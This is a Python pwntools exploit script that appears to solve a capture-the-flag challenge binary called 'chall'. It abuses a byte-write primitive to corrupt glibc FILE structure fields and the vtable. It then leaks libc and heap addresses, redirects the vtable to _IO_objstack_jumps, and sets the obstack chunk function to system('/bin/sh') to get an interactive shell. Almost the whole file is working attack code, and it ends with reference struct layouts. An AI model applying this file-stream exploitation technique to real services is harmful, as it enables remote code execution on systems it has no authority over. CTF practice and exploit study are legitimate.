#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfmate

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe = pwn.context.binary = pwn.ELF('chall')
#pwn.context.terminal = ["tilix", "-t", "CTFMate", "-a", "session-add-right", "-e"]
pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False
# pwn.context.timeout = 1000

host = pwn.args.HOST or '127.0.0.1'
port = int(pwn.args.PORT or 1337)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        return pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return pwn.process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    if pwn.args.GDB:
        pwn.gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


gdbscript = '''
source /home/nasm/Downloads/pwndbg/gdbinit.py
'''.format(**locals())

io = None
io = start()

class File:
    flags          = 0x0
    _IO_read_base  = 24
    _IO_read_end   = 0x10
    _IO_write_base = 0x20
    _IO_write_ptr  = 0x28
    _IO_write_end  = 0x30
    _IO_buf_base   = 0x38
    _IO_buf_end    = 0x40
    fileno         = 0x70
    vtable         = 0xd8
    objstack       = 0xe0

class objstack:
    chunkfun       = 56
    extra_arg      = 56+16
    use_extra_arg  = 56+16+8

def fflush():
    io.sendlineafter(b"> ", b"1")

def trick(offt, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"offset: ", str(offt).encode())
    io.sendlineafter(b"value: ", data)

def leave():
    io.sendlineafter(b"> ", b"0")

def write_ptr(ptr: bytes, offt: int, debug=True):
    for i in range(8):
        if ptr[i]:
            trick(offt + i, str(ptr[i]).encode())

def partial_write2(ptr: bytes, offt: int):
    for i in range(2):
        trick(offt + i, str(ptr[i]).encode())

def partial_write(ptr: bytes, offt: int):
    for i in range(1):
        trick(offt + i, str(ptr[i]).encode())

def leak_ptr(ptr: bytes) -> int:
    write_ptr(ptr, File._IO_read_end)
    write_ptr(ptr, File._IO_write_base)
    
    dest = (int.from_bytes(ptr, byteorder="little")+8).to_bytes(8, byteorder='little')

    write_ptr(dest, File._IO_write_ptr)
    # write_ptr(dest, 32 + 16)

    fflush()
    ret = pwn.u64(io.recv(8).ljust(8, b"\x00"))

    return ret

def main():
    # do_allocate
    partial_write(pwn.p8(0xa8), File.vtable)
    fflush()

    # _IO_file_underflow => _IO_default_pbackfail
    partial_write(pwn.p8(0x60), File.vtable)
    fflush()

    """
    int
    _IO_default_pbackfail (FILE *fp, int c)
    => not _IO_IN_BACKUP         0x0100
    => _IO_read_base == _IO_write_ptr
    => _IO_read_end == _IO_write_ptr + 8
    => _IO_write_end = right size
    """

    write_ptr(pwn.p64(0xfbad1800 | 0x8000), File.flags)

    partial_write(pwn.p8(0x70), File._IO_read_end)
    partial_write(pwn.p8(0x70), File._IO_write_base)

    partial_write(pwn.p8(0x78), File._IO_write_ptr)
    # partial_write(pwn.p8(0x78), 32+16)

    partial_write(pwn.p8(0xa0), File.vtable)
    write_ptr(pwn.p64(1), File.fileno)
    fflush()

    leak = pwn.u64(io.recv(8).ljust(8, b"\x00")) - 0x2160c0 + 0x2d160
    pwn.log.info(f"libc: {hex(leak)}")

    leak_main_arena = leak + 0x1ed5a0

    heap = leak_ptr(pwn.p64(leak_main_arena)) - 0x2a0
    pwn.log.info(f"heap: {hex(heap)}")

    _IO_objstack_jumps = leak + 0x1E9260
    pwn.log.info(f"_IO_objstack_jumps: {hex(_IO_objstack_jumps)}")

    # edit vtable => _IO_objstack_jumps
    write_ptr(pwn.p64(_IO_objstack_jumps - 8 * 9), File.vtable)
    write_ptr(pwn.p64(heap + 0x2a0), File.objstack)

    partial_write(pwn.p8(0xff), File._IO_read_base)

    write_ptr(b"/bin/sh\x00", File.flags + 8) # arg

    write_ptr(pwn.p64(leak + 0x52290), objstack.chunkfun) # fn ptr, system
    write_ptr(pwn.p64(heap + 0x2a0 + 8), objstack.extra_arg) # arg
    partial_write(pwn.p8(True), objstack.use_extra_arg)

    fflush()
    # system("/bin/sh")

    io.interactive()

if __name__ == "__main__":
    main()

"""
type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;
/*     40      |       8 */    char *_IO_write_ptr;
/*     48      |       8 */    char *_IO_write_end;
/*     56      |       8 */    char *_IO_buf_base;
/*     64      |       8 */    char *_IO_buf_end;
/*     72      |       8 */    char *_IO_save_base;
/*     80      |       8 */    char *_IO_backup_base;
/*     88      |       8 */    char *_IO_save_end;
/*     96      |       8 */    struct _IO_marker *_markers;
/*    104      |       8 */    struct _IO_FILE *_chain;
/*    112      |       4 */    int _fileno;
/*    116      |       4 */    int _flags2;
/*    120      |       8 */    __off_t _old_offset;
/*    128      |       2 */    unsigned short _cur_column;
/*    130      |       1 */    signed char _vtable_offset;
/*    131      |       1 */    char _shortbuf[1];
/* XXX  4-byte hole      */
/*    136      |       8 */    _IO_lock_t *_lock;
/*    144      |       8 */    __off64_t _offset;
/*    152      |       8 */    struct _IO_codecvt *_codecvt;
/*    160      |       8 */    struct _IO_wide_data *_wide_data;
/*    168      |       8 */    struct _IO_FILE *_freeres_list;
/*    176      |       8 */    void *_freeres_buf;
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             }

struct obstack          /* control current object in current chunk */
{
  long chunk_size;              /* preferred size to allocate chunks in */
  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */
  char *object_base;            /* address of object we are building */
  char *next_free;              /* where to add next char to current object */
  char *chunk_limit;            /* address of char after current chunk */
  union
  {
    PTR_INT_TYPE tempint;
    void *tempptr;
  } temp;                       /* Temporary for some macros.  */
  int alignment_mask;           /* Mask of alignment for each object. */
  /* These prototypes vary based on 'use_extra_arg', and we use
     casts to the prototypeless function type in all assignments,
     but having prototypes here quiets -Wstrict-prototypes.  */
  struct _obstack_chunk *(*chunkfun) (void *, long);
  void (*freefun) (void *, struct _obstack_chunk *);
  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */
  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */
  unsigned maybe_empty_object : 1; /* There is a possibility that the current
				      chunk contains a zero-length object.  This
				      prevents freeing the chunk if we allocate
				      a bigger chunk to replace it. */
  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed
				     handler on error, but retained for binary
				     compatibility.  */
};


"""